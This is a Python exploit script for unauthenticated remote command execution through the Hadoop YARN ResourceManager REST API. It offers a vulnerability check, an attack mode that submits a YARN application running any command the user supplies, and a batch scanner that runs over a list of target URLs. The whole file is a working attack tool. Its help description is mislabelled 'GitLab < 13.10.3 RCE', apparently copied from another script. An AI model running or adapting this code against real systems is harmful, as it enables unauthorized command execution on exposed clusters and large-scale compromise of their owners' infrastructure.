import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import argparse

requests.packages.urllib3.disable_warnings()

def title():
    print("""
         _   _           _                    __   __ _    ____  _   _   ____   ____ _____ 
        | | | | __ _  __| | ___   ___  _ __   \ \ / // \  |  _ \| \ | | |  _ \ / ___| ____|
        | |_| |/ _` |/ _` |/ _ \ / _ \| '_ \   \ V // _ \ | |_) |  \| | | |_) | |   |  _|  
        |  _  | (_| | (_| | (_) | (_) | |_) |   | |/ ___ \|  _ <| |\  | |  _ <| |___| |___ 
        |_| |_|\__,_|\__,_|\___/ \___/| .__/    |_/_/   \_\_| \_\_| \_| |_| \_\\____|_____|
                                      |_|                                                  
 
 	                                Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex                             
    	""")
    print('''
        验证模式：python Hadoop_Yan_RPC_RCE.py -v true -t target_url
        攻击模式：python Hadoop_Yan_RPC_RCE.py -a true -t target_url -c command 
        批量检测：python Hadoop_Yan_RPC_RCE.py -s true -f file 
        ''')    

def check(target_url):
    url = target_url + "/ws/v1/cluster/apps/new-application"
    reps = requests.post(url)
    if "Cores" in reps.text or "memory" in reps.text:
        print("[+] {} is Vulnerable!!!".format(target_url))
        
    else:
        print("[-] {} isn't Vulnerable.".format(target_url))

def attack(target_url,command):
    url_1 = target_url + '/ws/v1/cluster/apps/new-application'
    reps_1 = requests.post(url_1)
    app_id = reps_1.json()['application-id']

    appnames = "hello"+str(random.randint(100,500))
    url_2 = target_url + '/ws/v1/cluster/apps'
    data = {
        'application-id': app_id,
        'application-name': appnames,
        'am-container-spec': {
            'commands': {
                'command': command,
            },
        },
        'application-type': 'YARN',
    }
    requests.post(url_2, json=data)
    print("[+] Please check the result on dnslog platform or you VPS.")

def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip())
                check(url_path)

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))    

def main():
    parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
    parser.add_argument('-v', '--verify', type=bool,help=' 验证模式 ')
    parser.add_argument('-t', '--target', type=str, help=' 目标URL ')

    parser.add_argument('-a', '--attack', type=bool, help=' 攻击模式 ')
    parser.add_argument('-c', '--command', type=str, help=' 执行命令 ')

    parser.add_argument('-s', '--scan', type=bool, help=' 批量模式 ')
    parser.add_argument('-f', '--file', type=str, help=' 文件路径 ')


    args = parser.parse_args()

    verify_model = args.verify
    target_url   = args.target

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    if verify_model is True and target_url !=None:
        check(target_url)
    elif attack_model is True and target_url != None and command != None:
        attack(target_url,command)
    elif scan_model is True and file != None:
        scan(file)
    else:
        sys.exit(0)   

if __name__ == '__main__':
    title()
    main()